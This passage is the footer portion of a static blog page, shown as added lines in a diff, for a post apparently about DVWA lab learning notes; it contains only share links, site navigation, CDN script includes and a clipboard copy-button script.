+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&name=DVWA靶场学习记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/09/2021-04-09-DVWA%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/&t=DVWA靶场学习记录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    芝麻糊
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
